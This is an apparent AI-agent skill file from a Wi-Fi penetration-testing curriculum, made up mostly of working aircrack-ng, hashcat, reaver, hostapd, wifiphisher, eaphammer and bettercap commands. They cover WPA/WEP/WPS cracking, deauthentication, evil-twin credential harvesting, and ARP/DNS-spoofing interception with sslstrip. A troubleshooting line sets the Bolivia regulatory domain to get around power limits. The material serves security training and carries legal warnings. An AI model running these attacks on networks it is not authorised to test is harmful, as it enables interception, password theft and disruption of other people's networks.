---
name: wireless-security-wifi-penetration-testing
description: Hands-on wireless security and Wi-Fi penetration testing with aircrack-ng, covering 802.11, WEP/WPA/WPA2/WPA3 attacks, evil twins, and enterprise assessment
triggers:
  - how do I crack WPA2 with aircrack-ng
  - capture WPA handshake with airodump-ng
  - set up monitor mode for wifi pentesting
  - perform deauth attack on wireless network
  - crack WEP encryption with aircrack-ng
  - create evil twin access point
  - capture PMKID for hashcat
  - test wireless network security
---

# Wireless Security & WiFi Penetration Testing

> Skill by [ara.so](https://ara.so) — Security Skills collection.

This skill provides comprehensive guidance on wireless security assessment and Wi-Fi penetration testing using industry-standard tools from the aircrack-ng suite. It covers 802.11 protocol analysis, WEP/WPA/WPA2/WPA3 attacks, rogue access points, and enterprise wireless assessment.

## Overview

This project is an open, hands-on study curriculum for wireless security and Wi-Fi penetration testing. It teaches:

- 802.11 protocol fundamentals and frame analysis
- Wireless adapter setup for monitor mode and packet injection
- WEP/WPA/WPA2/WPA3 encryption attacks
- Evil twin and rogue access point deployment
- Enterprise WPA (EAP/RADIUS) assessment
- Wireless MITM and traffic analysis
- Professional penetration test reporting

**Key Tools:** aircrack-ng, airodump-ng, aireplay-ng, airbase-ng, hashcat, hcxdumptool, kismet, hostapd, dnsmasq, wireshark

## Prerequisites

### Hardware Requirements

1. **Injection-capable wireless adapter** (required)
   - Atheros AR9271 (e.g., TP-Link TL-WN722N v1, Alfa AWUS036NHA)
   - Ralink RT3070/RT5372 (e.g., Alfa AWUS036NEH)
   - **NOT** built-in laptop Wi-Fi (usually cannot enter monitor mode)

2. **Test environment**
   - Dedicated router/AP you own and control
   - Client device(s) for handshake generation
   - Isolated RF environment (no interference with production networks)

### Software Requirements

Kali Linux (recommended) or any Linux distribution with:

```bash
# Install aircrack-ng suite
sudo apt update
sudo apt install aircrack-ng

# Install supplementary tools
sudo apt install hashcat hcxtools hcxdumptool \
  wireshark kismet hostapd dnsmasq \
  reaver bully wifite
```

## Adapter Setup & Monitor Mode

### 1. Identify Your Wireless Adapter

```bash
# List wireless interfaces
iwconfig

# Check USB wireless adapters
lsusb | grep -i wireless

# Verify chipset (look for Atheros/Ralink)
lsusb -v | grep -A 10 "Wireless"
```

### 2. Enable Monitor Mode

```bash
# Kill interfering processes
sudo airmon-ng check kill

# Enable monitor mode (creates wlan0mon)
sudo airmon-ng start wlan0

# Verify monitor mode
iwconfig wlan0mon
# Should show "Mode:Monitor"

# Alternative manual method
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up
```

### 3. Test Packet Injection

```bash
# Test injection capability (critical for attacks)
sudo aireplay-ng --test wlan0mon

# Expected output should show:
# Injection is working!
# Found X APs
```

### 4. Set Channel

```bash
# Set specific channel (e.g., channel 6)
sudo iwconfig wlan0mon channel 6

# Or use iw
sudo iw dev wlan0mon set channel 6
```

## Reconnaissance & Traffic Analysis

### Wireless Network Discovery

```bash
# Scan all channels for access points and clients
sudo airodump-ng wlan0mon

# Scan specific channel (more focused)
sudo airodump-ng -c 6 wlan0mon

# Scan 2.4GHz band only
sudo airodump-ng --band bg wlan0mon

# Scan 5GHz band
sudo airodump-ng --band a wlan0mon

# Save output to file
sudo airodump-ng -w scan_results --output-format csv wlan0mon
```

**Key fields in airodump-ng output:**
- `BSSID`: MAC address of AP
- `PWR`: Signal strength
- `#Data`: Number of data packets
- `CH`: Channel
- `ENC`: Encryption (OPN/WEP/WPA/WPA2/WPA3)
- `ESSID`: Network name
- `STATION`: Connected clients

### Target Specific Network

```bash
# Focus on specific BSSID and channel
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Include only packets from specific AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF --essid "TargetNetwork" -w capture wlan0mon
```

## WPA/WPA2 Handshake Capture & Cracking

### Capture WPA Handshake

```bash
# Terminal 1: Start capturing on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_handshake wlan0mon

# Terminal 2: Deauthenticate a client to force handshake
# (only against networks you own/have permission to test)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Watch for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump-ng output
```

### Verify Handshake Capture

```bash
# Check if handshake was captured
sudo aircrack-ng wpa_handshake-01.cap

# Alternative with cowpatty
cowpatty -r wpa_handshake-01.cap -c
```

### Crack WPA/WPA2 with Aircrack-ng

```bash
# Dictionary attack with wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt wpa_handshake-01.cap

# Specify BSSID if multiple networks in capture
sudo aircrack-ng -w wordlist.txt -b AA:BB:CC:DD:EE:FF wpa_handshake-01.cap

# Use larger wordlist
sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -l cracked_key.txt wpa_handshake-01.cap
```

### Crack with Hashcat (GPU-accelerated)

```bash
# Convert capture to hashcat format
sudo aircrack-ng wpa_handshake-01.cap -J wpa_hash

# Or use hcxpcapngtool (newer)
hcxpcapngtool -o wpa_hash.hc22000 wpa_handshake-01.cap

# Crack with hashcat (WPA/WPA2 = mode 22000)
hashcat -m 22000 -a 0 wpa_hash.hc22000 /usr/share/wordlists/rockyou.txt

# With rules for better coverage
hashcat -m 22000 -a 0 wpa_hash.hc22000 wordlist.txt -r /usr/share/hashcat/rules/best64.rule

# Show cracked password
hashcat -m 22000 wpa_hash.hc22000 --show
```

## PMKID Attack (Clientless WPA/WPA2)

PMKID attack allows cracking WPA/WPA2 without capturing a handshake or waiting for clients.

```bash
# Capture PMKID with hcxdumptool
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Convert to hashcat format
hcxpcapngtool -o pmkid.hc22000 pmkid_capture.pcapng

# Crack with hashcat
hashcat -m 22000 -a 0 pmkid.hc22000 /usr/share/wordlists/rockyou.txt

# Alternative: use hcxtools for filtering
hcxpcapngtool -E essidlist.txt -I identitylist.txt -U usernamelist.txt \
  -o pmkid.hc22000 pmkid_capture.pcapng
```

## WEP Cracking

### Passive WEP Cracking (IV collection)

```bash
# Capture IVs on target network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Wait for 20,000+ IVs, then crack
sudo aircrack-ng wep_capture-01.cap

# Specify key length if known
sudo aircrack-ng -n 64 wep_capture-01.cap  # 64-bit WEP
sudo aircrack-ng -n 128 wep_capture-01.cap # 128-bit WEP
```

### Active WEP Cracking (ARP replay)

```bash
# Terminal 1: Capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_active wlan0mon

# Terminal 2: Fake authentication
sudo aireplay-ng --fakeauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Terminal 3: ARP replay attack (accelerates IV generation)
sudo aireplay-ng --arpreplay -b AA:BB:CC:DD:EE:FF wlan0mon

# Watch IV count in airodump-ng, crack when sufficient
sudo aircrack-ng wep_active-01.cap
```

### WEP ChopChop Attack

```bash
# Perform chopchop attack to decrypt a packet
sudo aireplay-ng --chopchop -b AA:BB:CC:DD:EE:FF wlan0mon

# Use decrypted packet to forge ARP requests
sudo packetforge-ng --arp -a AA:BB:CC:DD:EE:FF -h 11:22:33:44:55:66 \
  -k 192.168.1.100 -l 192.168.1.1 -y replay_dec*.xor -w arp_packet

# Inject forged packet
sudo aireplay-ng --interactive -r arp_packet wlan0mon
```

## Evil Twin / Rogue Access Point

### Basic Evil Twin with Hostapd

```bash
# Create hostapd.conf
cat > evil_twin.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=TargetNetwork
hw_mode=g
channel=6
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=Password123
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

# Start evil twin AP
sudo hostapd evil_twin.conf
```

### Evil Twin with Internet (MITM)

```bash
# Setup network interfaces
# wlan0 = evil twin AP
# wlan1 or eth0 = internet connection

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT

# Configure DHCP with dnsmasq
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.100.10,192.168.100.100,12h
dhcp-option=3,192.168.100.1
dhcp-option=6,192.168.100.1
server=8.8.8.8
log-queries
log-dhcp
EOF

# Assign IP to AP interface
sudo ip addr add 192.168.100.1/24 dev wlan0

# Start DHCP server
sudo dnsmasq -C dnsmasq.conf -d

# Start hostapd in another terminal
sudo hostapd evil_twin.conf
```

### Automated Evil Twin with Wifiphisher

```bash
# Install wifiphisher
sudo apt install wifiphisher

# Run automated evil twin attack
sudo wifiphisher -aI wlan0 -eI wlan1

# With specific SSID
sudo wifiphisher -aI wlan0 -eI wlan1 -e "TargetNetwork"

# Use firmware upgrade template
sudo wifiphisher -aI wlan0 -eI wlan1 -p firmware-upgrade
```

## Deauthentication Attack

```bash
# Deauth all clients on network (broadcast)
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth specific client
sudo aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Send limited deauth frames (10)
sudo aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon

# Use mdk4 for beacon flooding / deauth
sudo mdk4 wlan0mon d -c 6 -b blacklist.txt

# Create blacklist file
echo "AA:BB:CC:DD:EE:FF" > blacklist.txt
```

## WPS Attacks

### WPS PIN Brute Force with Reaver

```bash
# Scan for WPS-enabled APs
sudo wash -i wlan0mon

# Attack WPS PIN
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv

# With delay to avoid rate limiting
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -d 2 -T 0.5

# Specify channel
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv
```

### WPS Pixie Dust Attack with Reaver

```bash
# Attempt pixie dust attack (faster, exploits weak randomness)
sudo reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K

# Alternative with bully
sudo bully wlan0mon -b AA:BB:CC:DD:EE:FF -d -v 3
```

## Traffic Analysis & Interception

### Capture and Analyze with Wireshark

```bash
# Capture to file
sudo airodump-ng -w capture --output-format pcap wlan0mon

# Open in Wireshark
wireshark capture-01.cap

# Filter examples in Wireshark:
# - WPA handshake: eapol
# - Deauth frames: wlan.fc.type_subtype == 0x0c
# - Beacon frames: wlan.fc.type_subtype == 0x08
# - Data frames: wlan.fc.type == 2
```

### MITM with Bettercap

```bash
# Run bettercap on evil twin interface
sudo bettercap -iface wlan0

# Bettercap interactive commands:
# net.probe on              # Discover clients
# set arp.spoof.targets 192.168.100.0/24
# arp.spoof on              # ARP spoofing
# net.sniff on              # Capture traffic
# set http.proxy.sslstrip true
# http.proxy on             # HTTP proxy with SSL strip
# set dns.spoof.domains example.com
# dns.spoof on              # DNS spoofing
```

## Enterprise WPA (EAP/RADIUS) Assessment

### Capture EAP Credentials

```bash
# Capture on enterprise network
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w enterprise_capture wlan0mon

# Extract identities with hcxpcapngtool
hcxpcapngtool -E identities.txt enterprise_capture-01.cap

# Look for EAP frames in Wireshark
wireshark enterprise_capture-01.cap
# Filter: eap
```

### Evil Twin for EAP Credential Harvesting

```bash
# Use eaphammer for enterprise evil twin
git clone https://github.com/s0lst1c3/eaphammer.git
cd eaphammer

# Setup
./kali-setup

# Launch evil twin targeting enterprise network
sudo ./eaphammer -i wlan0 --auth wpa-eap --essid "Corporate-WiFi" --creds
```

## Wireless IDS with Kismet

```bash
# Install kismet
sudo apt install kismet

# Add user to kismet group
sudo usermod -aG kismet $USER

# Start kismet
kismet -c wlan0mon

# Access web interface
# http://localhost:2501

# Export captured data
kismet_cap_pcap --in kismet-log.kismet --out kismet_export.pcap
```

## Configuration & Best Practices

### Regulatory Domain

```bash
# Check current regulatory domain
iw reg get

# Set regulatory domain (required for legal operation)
sudo iw reg set US  # or your country code (GB, DE, etc.)

# Make permanent by editing /etc/default/crda
echo 'REGDOMAIN=US' | sudo tee -a /etc/default/crda
```

### Wordlist Preparation

```bash
# Extract rockyou.txt
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Create custom wordlist with crunch
crunch 8 12 -t @@@@%%%% -o custom_wordlist.txt
# @ = lowercase, % = number

# WPA-specific wordlist (8-63 chars)
crunch 8 8 0123456789 -o wpa_numeric.txt

# Combine multiple wordlists
cat wordlist1.txt wordlist2.txt | sort -u > combined.txt
```

### Managing Monitor Mode

```bash
# Stop monitor mode
sudo airmon-ng stop wlan0mon

# Restart network services
sudo systemctl restart NetworkManager

# Reset interface if stuck
sudo ip link set wlan0 down
sudo ip link set wlan0 up
sudo systemctl restart NetworkManager
```

## Common Patterns & Workflows

### Complete WPA/WPA2 Attack Workflow

```bash
#!/bin/bash
# wpa_attack.sh - Automated WPA/WPA2 handshake capture and crack

TARGET_BSSID="AA:BB:CC:DD:EE:FF"
TARGET_CHANNEL="6"
WORDLIST="/usr/share/wordlists/rockyou.txt"

# Enable monitor mode
sudo airmon-ng start wlan0

# Capture handshake in background
sudo airodump-ng -c $TARGET_CHANNEL --bssid $TARGET_BSSID \
  -w handshake wlan0mon &
AIRODUMP_PID=$!

# Wait for capture to start
sleep 5

# Send deauth packets
sudo aireplay-ng --deauth 10 -a $TARGET_BSSID wlan0mon

# Wait for handshake
echo "Waiting 30 seconds for handshake..."
sleep 30

# Stop capture
sudo kill $AIRODUMP_PID

# Crack handshake
sudo aircrack-ng -w $WORDLIST handshake-01.cap

# Cleanup
sudo airmon-ng stop wlan0mon
```

### Automated Reconnaissance Script

```bash
#!/bin/bash
# wifi_recon.sh - Automated wireless reconnaissance

INTERFACE="wlan0"
DURATION=300  # 5 minutes

# Enable monitor mode
sudo airmon-ng start $INTERFACE

# Scan all channels
echo "Scanning for $DURATION seconds..."
timeout $DURATION sudo airodump-ng -w recon_scan --output-format csv ${INTERFACE}mon

# Parse results
echo "Access Points found:"
grep -v "^BSSID" recon_scan-01.csv | awk -F',' '{print $14,$4,$6}' | sort -u

# Disable monitor mode
sudo airmon-ng stop ${INTERFACE}mon
```

## Troubleshooting

### Adapter Not Entering Monitor Mode

```bash
# Kill conflicting processes
sudo airmon-ng check kill

# Manually set monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Check for firmware issues
dmesg | grep -i firmware
sudo apt install firmware-atheros firmware-ralink

# Verify driver
lsmod | grep -E "ath9k|rt2800usb"
```

### Injection Test Fails

```bash
# Verify monitor mode is active
iwconfig wlan0mon

# Check channel setting
sudo iwconfig wlan0mon channel 6

# Test injection on different channel
sudo aireplay-ng --test -c 11 wlan0mon

# Update aircrack-ng
sudo apt update && sudo apt install --reinstall aircrack-ng

# Try different adapter if persistent failure
```

### No Handshake Captured

```bash
# Verify clients are connected to target AP
# Look for STATION entries in airodump-ng

# Increase deauth packet count
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF wlan0mon

# Try deauthing specific client
sudo aireplay-ng --deauth 20 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon

# Verify channel matches AP
sudo iwconfig wlan0mon channel 6

# Check for 802.11w (management frame protection)
# Some APs ignore deauth when MFP is enabled
```

### Aircrack-ng Not Cracking

```bash
# Verify handshake is present
sudo aircrack-ng handshake-01.cap
# Look for "1 handshake" message

# Ensure wordlist is not compressed
gunzip /usr/share/wordlists/rockyou.txt.gz

# Try different wordlist
sudo aircrack-ng -w /usr/share/wordlists/fasttrack.txt handshake-01.cap

# Use hashcat for GPU acceleration
hcxpcapngtool -o hash.hc22000 handshake-01.cap
hashcat -m 22000 hash.hc22000 wordlist.txt
```

### Evil Twin Not Accepting Clients

```bash
# Verify hostapd configuration
sudo hostapd -dd evil_twin.conf

# Check interface is not in monitor mode
sudo airmon-ng stop wlan0mon
# Run hostapd on managed mode interface

# Verify DHCP is running
sudo ps aux | grep dnsmasq

# Check IP forwarding
cat /proc/sys/net/ipv4/ip_forward  # Should output 1

# Verify iptables rules
sudo iptables -t nat -L -v
```

### Regulatory Domain Issues

```bash
# Some adapters require specific regulatory domain
sudo iw reg set BO  # Bolivia (often used for testing)

# Check allowed channels
iw list | grep -A 15 "Frequencies:"

# Manually set channel and txpower
sudo iwconfig wlan0mon channel 6
sudo iwconfig wlan0mon txpower 20
```

## Legal & Ethical Considerations

**WARNING:** All techniques in this project are for authorized testing only.

- ✅ **Authorized:** Your own equipment, lab environment, client-approved penetration tests
- ❌ **Illegal:** Any network you don't own or have explicit written permission to test

Wireless attacks (deauthentication, jamming, rogue APs, handshake capture, cracking) are illegal under:
- **US:** Computer Fraud and Abuse Act (CFAA), Wiretap Act
- **UK:** Computer Misuse Act
- **EU:** Directive 2013/40/EU
- **Other jurisdictions:** Similar computer crime and telecommunications laws

**Best practices:**
- Obtain written permission before any wireless assessment
- Test in isolated RF environment (Faraday cage, low power, shielded room)
- Document scope and rules of engagement
- Report findings responsibly
- Never transmit on unauthorized frequencies or exceed regulatory power limits

## Additional Resources

- **Official aircrack-ng documentation:** https://aircrack-ng.org/documentation.html
- **Hashcat wiki:** https://hashcat.net/wiki/
- **Kismet documentation:** https://www.kismetwireless.net/docs/
- **OSWP certification:** https://www.offensive-security.com/wireless-professional-oswp/
- **Project homepage:** https://www.armourinfosec.com

---

**License:** CC BY 4.0  
**Repository:** https://github.com/armourinfosec/Wireless-Security-and-WiFi-Penetration-Testing
